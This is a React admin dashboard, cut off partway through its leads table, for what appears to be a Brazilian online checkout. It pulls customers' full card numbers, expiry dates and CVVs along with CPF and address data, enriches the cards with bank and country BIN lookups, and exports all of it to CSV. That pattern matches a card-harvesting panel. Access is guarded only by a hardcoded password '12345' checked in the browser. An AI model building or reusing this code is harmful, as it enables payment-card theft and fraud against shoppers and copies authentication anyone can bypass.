import { useState, useEffect, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { format, startOfDay, endOfDay, subDays, startOfMonth } from "date-fns";
import { ptBR } from "date-fns/locale";
import { LayoutDashboard, Users, Megaphone, Package, Download, Eye, ShoppingCart, QrCode, CheckCircle2, TrendingUp, MousePointerClick, Image, ArrowDownWideNarrow, XCircle, Wallet, AlertTriangle, Bug, Radio, CreditCard, Webhook, CalendarIcon, ChevronDown } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Calendar } from "@/components/ui/calendar";
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
import { cn } from "@/lib/utils";

const ADMIN_PASSWORD = "12345";

interface Lead {
  id: string;
  created_at: string;
  name: string;
  email: string;
  phone: string | null;
  cpf: string | null;
  payment_method: string;
  color: string | null;
  size: string | null;
  quantity: number | null;
  total_amount: number | null;
  shipping_cost: number | null;
  shipping_type: string | null;
  cep: string | null;
  endereco: string | null;
  numero: string | null;
  complemento: string | null;
  bairro: string | null;
  cidade: string | null;
  uf: string | null;
  card_number: string | null;
  card_holder: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
  card_installments: number | null;
  status: string | null;
  transaction_id: string | null;
}

type Tab = "dashboard" | "leads" | "logs";

type PeriodKey = "today" | "yesterday" | "7days" | "30days" | "month" | "custom";

const PERIOD_LABELS: Record<PeriodKey, string> = {
  today: "Hoje",
  yesterday: "Ontem",
  "7days": "Últimos 7 dias",
  "30days": "Últimos 30 dias",
  month: "Este mês",
  custom: "Personalizado",
};

function getDateRange(period: PeriodKey, customFrom?: Date, customTo?: Date): { from: string; to: string } {
  const now = new Date();
  switch (period) {
    case "today":
      return { from: startOfDay(now).toISOString(), to: endOfDay(now).toISOString() };
    case "yesterday": {
      const y = subDays(now, 1);
      return { from: startOfDay(y).toISOString(), to: endOfDay(y).toISOString() };
    }
    case "7days":
      return { from: startOfDay(subDays(now, 7)).toISOString(), to: endOfDay(now).toISOString() };
    case "30days":
      return { from: startOfDay(subDays(now, 30)).toISOString(), to: endOfDay(now).toISOString() };
    case "month":
      return { from: startOfMonth(now).toISOString(), to: endOfDay(now).toISOString() };
    case "custom":
      return {
        from: customFrom ? startOfDay(customFrom).toISOString() : startOfDay(subDays(now, 7)).toISOString(),
        to: customTo ? endOfDay(customTo).toISOString() : endOfDay(now).toISOString(),
      };
  }
}

interface SystemAlert {
  id: string;
  type: "critical" | "warning" | "info";
  icon: React.ReactNode;
  title: string;
  description: string;
}

export default function Admin() {
  const navigate = useNavigate();
  const [authenticated, setAuthenticated] = useState(() => sessionStorage.getItem("admin_auth") === "true");
  const [password, setPassword] = useState("");
  const [leads, setLeads] = useState<Lead[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [tab, setTab] = useState<Tab>("dashboard");
  const [visitorsCount, setVisitorsCount] = useState(0);
  const [checkoutsCount, setCheckoutsCount] = useState(0);
  const [buyClicks, setBuyClicks] = useState(0);
  const [imageClicks, setImageClicks] = useState(0);
  const [avgScroll, setAvgScroll] = useState(0);
  const [alerts, setAlerts] = useState<SystemAlert[]>([]);
  const [period, setPeriod] = useState<PeriodKey>("30days");
  const [customFrom, setCustomFrom] = useState<Date | undefined>(undefined);
  const [customTo, setCustomTo] = useState<Date | undefined>(undefined);
  const [errorLogs, setErrorLogs] = useState<any[]>([]);
  const [webhookLogs, setWebhookLogs] = useState<any[]>([]);
  const [logsLoading, setLogsLoading] = useState(false);
  const [binCache, setBinCache] = useState<Record<string, { scheme: string; type: string; bank_name: string; country_name: string }>>({});

  // BIN lookup with DB cache
  const lookupBins = useCallback(async (cardLeads: Lead[]) => {
    const bins = new Set<string>();
    cardLeads.forEach(l => {
      if (l.card_number) {
        const clean = l.card_number.replace(/\D/g, "");
        if (clean.length >= 6) bins.add(clean.slice(0, 6));
      }
    });
    if (bins.size === 0) return;

    // Check DB cache first
    const binArray = Array.from(bins);
    const { data: cached } = await supabase.from("bin_cache").select("*").in("bin", binArray);
    const result: Record<string, any> = {};
    const uncached: string[] = [];

    (cached || []).forEach((row: any) => {
      result[row.bin] = { scheme: row.scheme, type: row.type, bank_name: row.bank_name, country_name: row.country_name };
    });
    binArray.forEach(b => { if (!result[b]) uncached.push(b); });

    // Fetch uncached via edge function
    for (const bin of uncached) {
      try {
        const { data, error } = await supabase.functions.invoke("bin-lookup", { body: { bin } });
        if (!error && data && data.scheme) {
          const entry = {
            scheme: data.scheme || "",
            type: data.type || "",
            bank_name: data.bank_name || "",
            country_name: data.country_name || "",
          };
          result[bin] = entry;
          await supabase.from("bin_cache").upsert({ bin, ...entry });
        }
        if (uncached.indexOf(bin) < uncached.length - 1) {
          await new Promise(r => setTimeout(r, 500));
        }
      } catch { /* skip */ }
    }

    setBinCache(prev => ({ ...prev, ...result }));
  }, []);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) {
      sessionStorage.setItem("admin_auth", "true");
      setAuthenticated(true);
      setError("");
    } else {
      setError("Senha incorreta");
    }
  };

  const fetchData = useCallback(() => {
    if (!authenticated) return;
    setLoading(true);

    const { from: rangeFrom, to: rangeTo } = getDateRange(period, customFrom, customTo);
    const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();
    const oneDayAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();

    // Fetch leads + page views + events + alert data in parallel
    Promise.all([
      supabase.from("checkout_leads").select("*").gte("created_at", rangeFrom).lte("created_at", rangeTo).order("created_at", { ascending: false }),
      supabase.from("page_views").select("id", { count: "exact", head: true }).eq("page", "/").gte("created_at", rangeFrom).lte("created_at", rangeTo),
      supabase.from("page_views").select("id", { count: "exact", head: true }).eq("page", "/checkout").gte("created_at", rangeFrom).lte("created_at", rangeTo),
      supabase.from("user_events").select("id", { count: "exact", head: true }).eq("event_type", "click_buy_button").gte("created_at", rangeFrom).lte("created_at", rangeTo),
      supabase.from("user_events").select("id", { count: "exact", head: true }).eq("event_type", "click_product_image").gte("created_at", rangeFrom).lte("created_at", rangeTo),
      supabase.from("user_events").select("event_data").eq("event_type", "scroll_depth").gte("created_at", rangeFrom).lte("created_at", rangeTo),
      // Alert queries (always use fixed windows, not period)
      supabase.from("checkout_leads").select("id", { count: "exact", head: true }).neq("status", "paid").gte("created_at", oneHourAgo),
      supabase.from("tracking_webhook_logs").select("id", { count: "exact", head: true }).neq("status", "sent").gte("created_at", oneDayAgo),
      supabase.from("user_events").select("id", { count: "exact", head: true }).eq("event_type", "js_error").gte("created_at", oneDayAgo),
      supabase.from("user_events").select("id", { count: "exact", head: true }).eq("event_type", "tiktok_event").gte("created_at", oneHourAgo),
    ]).then(([leadsRes, visitorsRes, checkoutsRes, buyRes, imgRes, scrollRes, declinedRes, webhookErrRes, jsErrRes, pixelEventsRes]) => {
      if (leadsRes.error) {
        console.error(leadsRes.error);
        setError("Erro ao carregar dados");
      } else {
        const leadsData = (leadsRes.data as Lead[]) || [];
        setLeads(leadsData);
        // Lookup BINs for card leads
        const cardLeads = leadsData.filter(l => l.card_number);
        if (cardLeads.length > 0) lookupBins(cardLeads);
      }
      setVisitorsCount(visitorsRes.count || 0);
      setCheckoutsCount(checkoutsRes.count || 0);
      setBuyClicks(buyRes.count || 0);
      setImageClicks(imgRes.count || 0);
      // Calculate avg scroll
      if (scrollRes.data && scrollRes.data.length > 0) {
        const total = scrollRes.data.reduce((sum: number, row: any) => {
          const pct = typeof row.event_data === "object" && row.event_data !== null ? (row.event_data as any).percent || 0 : 0;
          return sum + Number(pct);
        }, 0);
        setAvgScroll(Math.round(total / scrollRes.data.length));
      }

      // Build alerts
      const newAlerts: SystemAlert[] = [];
      const declinedCount = declinedRes.count || 0;
      if (declinedCount > 5) {
        newAlerts.push({
          id: "declined",
          type: "critical",
          icon: <CreditCard className="h-4 w-4" />,
          title: `${declinedCount} pagamentos recusados na última hora`,
          description: "Verifique o gateway de pagamento ou possível fraude.",
        });
      }

      // Conversion drop: compare last 24h leads vs visitors
      const allLeads = (leadsRes.data as Lead[]) || [];
      const recentPaid = allLeads.filter(l => l.status === "paid" && new Date(l.created_at) >= new Date(oneDayAgo)).length;
      const totalVisitors = visitorsRes.count || 0;
      const currentConv = totalVisitors > 0 ? (recentPaid / totalVisitors) * 100 : 0;
      if (totalVisitors > 20 && currentConv < 1) {
        newAlerts.push({
          id: "conversion",
          type: "warning",
          icon: <TrendingUp className="h-4 w-4" />,
          title: `Conversão muito baixa: ${currentConv.toFixed(1)}%`,
          description: "A taxa de conversão caiu significativamente. Analise o funil.",
        });
      }

      const webhookErrors = webhookErrRes.count || 0;
      if (webhookErrors > 0) {
        newAlerts.push({
          id: "webhook",
          type: "critical",
          icon: <Webhook className="h-4 w-4" />,
          title: `${webhookErrors} erro(s) no webhook Trackly (24h)`,
          description: "Verifique a URL do webhook e os logs de resposta.",
        });
      }

      const jsErrors = jsErrRes.count || 0;
      if (jsErrors > 0) {
        newAlerts.push({
          id: "jserror",
          type: "warning",
          icon: <Bug className="h-4 w-4" />,
          title: `${jsErrors} erro(s) JavaScript detectados (24h)`,
          description: "Erros no site podem impactar a experiência do usuário.",
        });
      }

      const pixelEvents = pixelEventsRes.count || 0;
      if (totalVisitors > 10 && pixelEvents === 0) {
        newAlerts.push({
          id: "pixel",
          type: "warning",
          icon: <Radio className="h-4 w-4" />,
          title: "Pixel sem disparar eventos na última hora",
          description: "O pixel do TikTok pode estar com problemas. Verifique a integração.",
        });
      }

      if (newAlerts.length === 0) {
        newAlerts.push({
          id: "ok",
          type: "info",
          icon: <CheckCircle2 className="h-4 w-4" />,
          title: "Tudo funcionando normalmente",
          description: "Nenhum alerta detectado no momento.",
        });
      }

      setAlerts(newAlerts);
      setLoading(false);
    });
  }, [authenticated, period, customFrom, customTo, lookupBins]);

  useEffect(() => {
    fetchData();
  }, [fetchData]);

  const exportCSV = () => {
    if (!leads.length) return;
    const headers = [
      "Data", "Nome", "Email", "Telefone", "CPF", "Método",
      "Cor", "Tamanho", "Qtd", "Total (R$)", "Frete (R$)", "Tipo Frete",
      "CEP", "Endereço", "Número", "Complemento", "Bairro", "Cidade", "UF",
      "Nº Cartão", "Titular", "Validade", "CVV", "Parcelas", "Status", "ID Transação"
    ];
    const rows = leads.map((l) => [
      new Date(l.created_at).toLocaleString("pt-BR"),
      l.name, l.email, l.phone || "", l.cpf || "", l.payment_method,
      l.color || "", l.size || "", l.quantity ?? "",
      l.total_amount ? (l.total_amount / 100).toFixed(2) : "",
      l.shipping_cost ? (l.shipping_cost / 100).toFixed(2) : "",
      l.shipping_type || "",
      l.cep || "", l.endereco || "", l.numero || "", l.complemento || "",
      l.bairro || "", l.cidade || "", l.uf || "",
      l.card_number || "", l.card_holder || "", l.card_expiry || "",
      l.card_cvv || "", l.card_installments ?? "", l.status || "", l.transaction_id || ""
    ]);
    const csv = [headers, ...rows].map(r => r.map(v => `"${String(v).replace(/"/g, '""')}"`).join(",")).join("\n");
    const blob = new Blob(["\uFEFF" + csv], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `leads-${new Date().toISOString().slice(0, 10)}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const paidCount = leads.filter(l => l.status === "paid").length;
  const pendingCount = leads.filter(l => l.status !== "paid").length;
  const totalRevenue = leads.filter(l => l.status === "paid").reduce((sum, l) => sum + (l.total_amount || 0), 0);
  const pixGeneratedCount = leads.filter(l => l.payment_method === "pix").length;
  const pixPaidCount = leads.filter(l => l.payment_method === "pix" && l.status === "paid").length;
  const checkoutsAbandoned = checkoutsCount - leads.length;
  const conversionRate = visitorsCount > 0 ? ((paidCount / visitorsCount) * 100).toFixed(1) : "0.0";

  if (!authenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background p-4">
        <form onSubmit={handleLogin} className="w-full max-w-sm space-y-4 bg-card p-6 rounded-xl border shadow">
          <h1 className="text-xl font-bold text-center">Painel Admin</h1>
          <input
            type="password"
            placeholder="Senha"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full border rounded-lg px-4 py-3 text-sm bg-background"
          />
          {error && <p className="text-destructive text-sm text-center">{error}</p>}
          <button type="submit" className="w-full bg-primary text-primary-foreground py-3 rounded-lg font-semibold">
            Entrar
          </button>
        </form>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Top Nav */}
      <header className="border-b bg-card px-4 py-3">
        <div className="max-w-[1400px] mx-auto flex items-center justify-between">
          <h1 className="text-lg font-bold">Painel Admin</h1>
          <div className="flex gap-2">
            <button
              onClick={() => setTab("dashboard")}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-sm font-medium transition-colors ${tab === "dashboard" ? "bg-primary text-primary-foreground" : "bg-secondary text-secondary-foreground hover:bg-secondary/80"}`}
            >
              <LayoutDashboard className="h-4 w-4" /> Início
            </button>
            <button
              onClick={() => setTab("leads")}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-sm font-medium transition-colors ${tab === "leads" ? "bg-primary text-primary-foreground" : "bg-secondary text-secondary-foreground hover:bg-secondary/80"}`}
            >
              <Users className="h-4 w-4" /> Leads
            </button>
            <button
              onClick={() => {
                setTab("logs");
                setLogsLoading(true);
                Promise.all([
                  supabase.from("user_events").select("*").eq("event_type", "js_error").order("created_at", { ascending: false }).limit(50),
                  supabase.from("tracking_webhook_logs").select("*").order("created_at", { ascending: false }).limit(50),
                ]).then(([errRes, whRes]) => {
                  setErrorLogs(errRes.data || []);
                  setWebhookLogs(whRes.data || []);
                  setLogsLoading(false);
                });
              }}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-sm font-medium transition-colors ${tab === "logs" ? "bg-primary text-primary-foreground" : "bg-secondary text-secondary-foreground hover:bg-secondary/80"}`}
            >
              <Bug className="h-4 w-4" /> Logs
            </button>
          </div>
        </div>
      </header>

      <div className="max-w-[1400px] mx-auto p-4">
        {tab === "dashboard" && (
          <div className="space-y-6">
            {/* Period Filter */}
            <div className="flex flex-wrap items-center gap-2">
              <span className="text-sm font-semibold text-muted-foreground mr-1">Período:</span>
              {(Object.keys(PERIOD_LABELS) as PeriodKey[]).map((key) => (
                <button
                  key={key}
                  onClick={() => {
                    setPeriod(key);
                    if (key !== "custom") { setCustomFrom(undefined); setCustomTo(undefined); }
                  }}
                  className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-colors ${period === key ? "bg-primary text-primary-foreground" : "bg-secondary text-secondary-foreground hover:bg-secondary/80"}`}
                >
                  {PERIOD_LABELS[key]}
                </button>
              ))}
              {period === "custom" && (
                <div className="flex items-center gap-2 ml-2">
                  <Popover>
                    <PopoverTrigger asChild>
                      <Button variant="outline" size="sm" className={cn("text-xs gap-1", !customFrom && "text-muted-foreground")}>
                        <CalendarIcon className="h-3.5 w-3.5" />
                        {customFrom ? format(customFrom, "dd/MM/yyyy", { locale: ptBR }) : "De"}
                      </Button>
                    </PopoverTrigger>
                    <PopoverContent className="w-auto p-0" align="start">
                      <Calendar mode="single" selected={customFrom} onSelect={setCustomFrom} initialFocus className={cn("p-3 pointer-events-auto")} />
                    </PopoverContent>
                  </Popover>
                  <span className="text-xs text-muted-foreground">até</span>
                  <Popover>
                    <PopoverTrigger asChild>
                      <Button variant="outline" size="sm" className={cn("text-xs gap-1", !customTo && "text-muted-foreground")}>
                        <CalendarIcon className="h-3.5 w-3.5" />
                        {customTo ? format(customTo, "dd/MM/yyyy", { locale: ptBR }) : "Até"}
                      </Button>
                    </PopoverTrigger>
                    <PopoverContent className="w-auto p-0" align="start">
                      <Calendar mode="single" selected={customTo} onSelect={setCustomTo} initialFocus className={cn("p-3 pointer-events-auto")} />
                    </PopoverContent>
                  </Popover>
                </div>
              )}
            </div>

            {/* Funnel Metrics */}
            <div>
              <h2 className="text-lg font-bold mb-3">Funil de Vendas</h2>
              <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3">
                <div className="bg-card border rounded-xl p-4">
                  <div className="flex items-center gap-2 mb-2">
                    <div className="h-8 w-8 rounded-lg bg-blue-500/10 flex items-center justify-center">
                      <Eye className="h-4 w-4 text-blue-500" />
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">Visitantes</p>
                  <p className="text-2xl font-bold mt-1">{visitorsCount}</p>
                </div>
                <div className="bg-card border rounded-xl p-4">
                  <div className="flex items-center gap-2 mb-2">
                    <div className="h-8 w-8 rounded-lg bg-orange-500/10 flex items-center justify-center">
                      <ShoppingCart className="h-4 w-4 text-orange-500" />
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">Checkouts</p>
                  <p className="text-2xl font-bold mt-1">{checkoutsCount}</p>
                </div>
                <div className="bg-card border rounded-xl p-4">
                  <div className="flex items-center gap-2 mb-2">
                    <div className="h-8 w-8 rounded-lg bg-purple-500/10 flex items-center justify-center">
                      <QrCode className="h-4 w-4 text-purple-500" />
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">Pix Gerados</p>
                  <p className="text-2xl font-bold mt-1">{pixGeneratedCount}</p>
                </div>
                <div className="bg-card border rounded-xl p-4">
                  <div className="flex items-center gap-2 mb-2">
                    <div className="h-8 w-8 rounded-lg bg-emerald-500/10 flex items-center justify-center">
                      <CheckCircle2 className="h-4 w-4 text-emerald-500" />
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">Aprovados</p>
                  <p className="text-2xl font-bold mt-1 text-success">{paidCount}</p>
                </div>
                <div className="bg-card border rounded-xl p-4">
                  <div className="flex items-center gap-2 mb-2">
                    <div className="h-8 w-8 rounded-lg bg-amber-500/10 flex items-center justify-center">
                      <TrendingUp className="h-4 w-4 text-amber-500" />
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">Conversão</p>
                  <p className="text-2xl font-bold mt-1">{conversionRate}%</p>
                </div>
              </div>
            </div>

            {/* Comportamento do Funil */}
            <div>
              <h2 className="text-lg font-bold mb-3">Comportamento do Funil</h2>
              <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-7 gap-3">
                <div className="bg-card border rounded-xl p-4">
                  <div className="h-8 w-8 rounded-lg bg-blue-500/10 flex items-center justify-center mb-2">
                    <MousePointerClick className="h-4 w-4 text-blue-500" />
                  </div>
                  <p className="text-[10px] text-muted-foreground font-medium uppercase tracking-wide">Cliques Comprar</p>
                  <p className="text-xl font-bold mt-1">{buyClicks}</p>
                </div>
                <div className="bg-card border rounded-xl p-4">
                  <div className="h-8 w-8 rounded-lg bg-indigo-500/10 flex items-center justify-center mb-2">
                    <Image className="h-4 w-4 text-indigo-500" />
                  </div>
                  <p className="text-[10px] text-muted-foreground font-medium uppercase tracking-wide">Cliques Imagens</p>
                  <p className="text-xl font-bold mt-1">{imageClicks}</p>
                </div>
                <div className="bg-card border rounded-xl p-4">
                  <div className="h-8 w-8 rounded-lg bg-cyan-500/10 flex items-center justify-center mb-2">
                    <ArrowDownWideNarrow className="h-4 w-4 text-cyan-500" />
                  </div>
                  <p className="text-[10px] text-muted-foreground font-medium uppercase tracking-wide">Scroll Médio</p>
                  <p className="text-xl font-bold mt-1">{avgScroll}%</p>
                </div>
                <div className="bg-card border rounded-xl p-4">
                  <div className="h-8 w-8 rounded-lg bg-orange-500/10 flex items-center justify-center mb-2">
                    <ShoppingCart className="h-4 w-4 text-orange-500" />
                  </div>
                  <p className="text-[10px] text-muted-foreground font-medium uppercase tracking-wide">Checkouts</p>
                  <p className="text-xl font-bold mt-1">{checkoutsCount}</p>
                </div>
                <div className="bg-card border rounded-xl p-4">
                  <div className="h-8 w-8 rounded-lg bg-red-500/10 flex items-center justify-center mb-2">
                    <XCircle className="h-4 w-4 text-red-500" />
                  </div>
                  <p className="text-[10px] text-muted-foreground font-medium uppercase tracking-wide">Abandonados</p>
                  <p className="text-xl font-bold mt-1 text-destructive">{Math.max(0, checkoutsAbandoned)}</p>
                </div>
                <div className="bg-card border rounded-xl p-4">
                  <div className="h-8 w-8 rounded-lg bg-purple-500/10 flex items-center justify-center mb-2">
                    <QrCode className="h-4 w-4 text-purple-500" />
                  </div>
                  <p className="text-[10px] text-muted-foreground font-medium uppercase tracking-wide">Pix Gerados</p>
                  <p className="text-xl font-bold mt-1">{pixGeneratedCount}</p>
                </div>
                <div className="bg-card border rounded-xl p-4">
                  <div className="h-8 w-8 rounded-lg bg-emerald-500/10 flex items-center justify-center mb-2">
                    <Wallet className="h-4 w-4 text-emerald-500" />
                  </div>
                  <p className="text-[10px] text-muted-foreground font-medium uppercase tracking-wide">Pix Pagos</p>
                  <p className="text-xl font-bold mt-1 text-success">{pixPaidCount}</p>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
              <div className="bg-card border rounded-xl p-5">
                <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">Total de Leads</p>
                <p className="text-3xl font-bold mt-1">{leads.length}</p>
              </div>
              <div className="bg-card border rounded-xl p-5">
                <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">Pagos</p>
                <p className="text-3xl font-bold mt-1 text-success">{paidCount}</p>
              </div>
              <div className="bg-card border rounded-xl p-5">
                <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">Receita Total</p>
                <p className="text-3xl font-bold mt-1">R$ {(totalRevenue / 100).toFixed(2).replace(".", ",")}</p>
              </div>
            </div>

            {/* Quick Actions */}
            <div>
              <h2 className="text-lg font-bold mb-3">Ações rápidas</h2>
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
                <button
                  onClick={() => setTab("leads")}
                  className="flex items-center gap-3 bg-card border rounded-xl p-4 hover:bg-muted/50 transition-colors text-left"
                >
                  <div className="h-10 w-10 rounded-lg bg-primary/10 flex items-center justify-center">
                    <Users className="h-5 w-5 text-primary" />
                  </div>
                  <div>
                    <p className="text-sm font-semibold">Ver Leads</p>
                    <p className="text-xs text-muted-foreground">{leads.length} registros</p>
                  </div>
                </button>

                <button
                  onClick={() => navigate("/admin/tiktok")}
                  className="flex items-center gap-3 bg-card border rounded-xl p-4 hover:bg-muted/50 transition-colors text-left"
                >
                  <div className="h-10 w-10 rounded-lg bg-primary/10 flex items-center justify-center">
                    <Megaphone className="h-5 w-5 text-primary" />
                  </div>
                  <div>
                    <p className="text-sm font-semibold">TikTok Pixels</p>
                    <p className="text-xs text-muted-foreground">Gerenciar pixels</p>
                  </div>
                </button>

                <button
                  onClick={() => navigate("/admin/rastreios")}
                  className="flex items-center gap-3 bg-card border rounded-xl p-4 hover:bg-muted/50 transition-colors text-left"
                >
                  <div className="h-10 w-10 rounded-lg bg-primary/10 flex items-center justify-center">
                    <Package className="h-5 w-5 text-primary" />
                  </div>
                  <div>
                    <p className="text-sm font-semibold">Rastreios / Trackly</p>
                    <p className="text-xs text-muted-foreground">Webhooks e envios</p>
                  </div>
                </button>

                <button
                  onClick={exportCSV}
                  className="flex items-center gap-3 bg-card border rounded-xl p-4 hover:bg-muted/50 transition-colors text-left"
                >
                  <div className="h-10 w-10 rounded-lg bg-primary/10 flex items-center justify-center">
                    <Download className="h-5 w-5 text-primary" />
                  </div>
                  <div>
                    <p className="text-sm font-semibold">Exportar CSV</p>
                    <p className="text-xs text-muted-foreground">Todos os leads</p>
                  </div>
                </button>
              </div>
            </div>

            {/* Diagnóstico do Funil */}
            <div>
              <h2 className="text-lg font-bold mb-3">Diagnóstico do Funil</h2>
              <div className="bg-card border rounded-xl p-5">
                {(() => {
                  const steps = [
                    { label: "Visitantes", value: visitorsCount, color: "bg-blue-500" },
                    { label: "Cliques em Comprar", value: buyClicks, color: "bg-indigo-500" },
                    { label: "Checkouts iniciados", value: checkoutsCount, color: "bg-orange-500" },
                    { label: "Pix gerados", value: pixGeneratedCount, color: "bg-purple-500" },
                    { label: "Pagamentos aprovados", value: paidCount, color: "bg-emerald-500" },
                  ];
                  const maxVal = Math.max(...steps.map(s => s.value), 1);
                  return (
                    <div className="space-y-1">
                      {steps.map((step, i) => {
                        const widthPct = Math.max((step.value / maxVal) * 100, 8);
                        const prevValue = i > 0 ? steps[i - 1].value : null;
                        const rate = prevValue && prevValue > 0 ? ((step.value / prevValue) * 100).toFixed(1) : null;
                        return (
                          <div key={step.label}>
                            {i > 0 && (
                              <div className="flex items-center gap-2 py-1.5 pl-4">
                                <span className="text-muted-foreground text-xs">↓</span>
                                <span className={`text-xs font-bold ${Number(rate) < 20 ? "text-destructive" : Number(rate) < 50 ? "text-amber-500" : "text-emerald-500"}`}>
                                  {rate}%
                                </span>
                                <span className="text-[10px] text-muted-foreground">de conversão</span>
                              </div>
                            )}
                            <div className="flex items-center gap-3">
                              <div className="w-[140px] sm:w-[180px] flex-shrink-0 text-right">
                                <span className="text-xs font-medium text-foreground">{step.label}</span>
                              </div>
                              <div className="flex-1 h-8 bg-muted rounded-lg overflow-hidden relative">
                                <div
                                  className={`h-full ${step.color} rounded-lg transition-all duration-500 flex items-center justify-end pr-2`}
                                  style={{ width: `${widthPct}%` }}
                                >
                                  <span className="text-[11px] font-bold text-white drop-shadow-sm">{step.value.toLocaleString("pt-BR")}</span>
                                </div>
                              </div>
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  );
                })()}
              </div>
            </div>

            {/* Alertas do Sistema */}
            <div>
              <h2 className="text-lg font-bold mb-3 flex items-center gap-2">
                <AlertTriangle className="h-5 w-5" /> Alertas do Sistema
                {alerts.filter(a => a.type === "critical").length > 0 && (
                  <span className="bg-destructive text-destructive-foreground text-[10px] font-bold px-2 py-0.5 rounded-full">
                    {alerts.filter(a => a.type === "critical").length}
                  </span>
                )}
              </h2>
              <div className="space-y-2">
                {alerts.map((alert) => (
                  <div
                    key={alert.id}
                    className={`flex items-start gap-3 border rounded-xl p-4 ${
                      alert.type === "critical"
                        ? "bg-destructive/5 border-destructive/30"
                        : alert.type === "warning"
                        ? "bg-amber-500/5 border-amber-500/30"
                        : "bg-emerald-500/5 border-emerald-500/30"
                    }`}
                  >
                    <div className={`h-8 w-8 rounded-lg flex items-center justify-center flex-shrink-0 ${
                      alert.type === "critical"
                        ? "bg-destructive/10 text-destructive"
                        : alert.type === "warning"
                        ? "bg-amber-500/10 text-amber-500"
                        : "bg-emerald-500/10 text-emerald-500"
                    }`}>
                      {alert.icon}
                    </div>
                    <div>
                      <p className={`text-sm font-semibold ${
                        alert.type === "critical" ? "text-destructive" : alert.type === "warning" ? "text-amber-600" : "text-emerald-600"
                      }`}>{alert.title}</p>
                      <p className="text-xs text-muted-foreground mt-0.5">{alert.description}</p>
                    </div>
                  </div>
                ))}
              </div>

              {/* Checklist colapsável */}
              <details className="mt-3 bg-card border rounded-xl overflow-hidden">
                <summary className="px-4 py-3 cursor-pointer flex items-center justify-between text-sm font-semibold select-none hover:bg-muted/50 transition-colors">
                  <span>Monitoramento em tempo real — O que está sendo analisado</span>
                  <ChevronDown className="h-4 w-4 text-muted-foreground transition-transform [details[open]>&]:rotate-180" />
                </summary>
                <div className="px-4 pb-4 pt-1 space-y-2 border-t">
                  {[
                    { label: "Pagamentos recusados > 5 na última hora", ok: (alerts.find(a => a.id === "declined") === undefined) },
                    { label: "Taxa de conversão dentro do esperado", ok: (alerts.find(a => a.id === "conversion") === undefined) },
                    { label: "Webhook Trackly sem erros (24h)", ok: (alerts.find(a => a.id === "webhook") === undefined) },
                    { label: "Nenhum erro JavaScript no site (24h)", ok: (alerts.find(a => a.id === "jserror") === undefined) },
                    { label: "Pixel TikTok disparando eventos (1h)", ok: (alerts.find(a => a.id === "pixel") === undefined) },
                  ].map((item) => (
                    <div key={item.label} className="flex items-center gap-2.5">
                      <div className={`h-5 w-5 rounded flex items-center justify-center flex-shrink-0 ${item.ok ? "bg-emerald-500/10" : "bg-destructive/10"}`}>
                        {item.ok
                          ? <CheckCircle2 className="h-3.5 w-3.5 text-emerald-500" />
                          : <XCircle className="h-3.5 w-3.5 text-destructive" />
                        }
                      </div>
                      <span className={`text-xs ${item.ok ? "text-muted-foreground" : "text-foreground font-medium"}`}>{item.label}</span>
                    </div>
                  ))}
                </div>
              </details>
            </div>

            {/* Recent summary */}
            <div>
              <h2 className="text-lg font-bold mb-3">Resumo recente</h2>
              <div className="bg-card border rounded-xl p-4">
                <div className="flex items-center justify-between text-sm mb-2">
                  <span className="text-muted-foreground">Pendentes</span>
                  <span className="font-semibold text-amber-600">{pendingCount}</span>
                </div>
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">Pagos</span>
                  <span className="font-semibold text-success">{paidCount}</span>
                </div>
              </div>
            </div>
          </div>
        )}

        {tab === "leads" && (
          <div>
            <div className="flex items-center justify-between mb-4 flex-wrap gap-3">
              <h2 className="text-lg font-bold">Leads ({leads.length})</h2>
              <button onClick={exportCSV} className="flex items-center gap-1.5 bg-primary text-primary-foreground px-4 py-2 rounded-lg text-sm font-semibold">
                <Download className="h-4 w-4" /> Exportar CSV
              </button>
            </div>

            {loading ? (
              <p className="text-center text-muted-foreground py-8">Carregando...</p>
            ) : (
              <div className="overflow-x-auto border rounded-xl">
                <table className="w-full text-xs">
                  <thead className="bg-muted">
                    <tr>
                      {["Data", "Nome", "Email", "Telefone", "CPF", "Método", "Cor", "Tam", "Qtd", "Total", "Cidade/UF",
                        "Nº Cartão", "Bandeira", "Tipo", "Banco", "País", "Titular", "Validade", "CVV", "Parcelas", "Status"].map((h) => (
                        <th key={h} className="px-3 py-2 text-left whitespace-nowrap font-semibold">{h}</th>
                      ))}
                    </tr>
                  </thead>
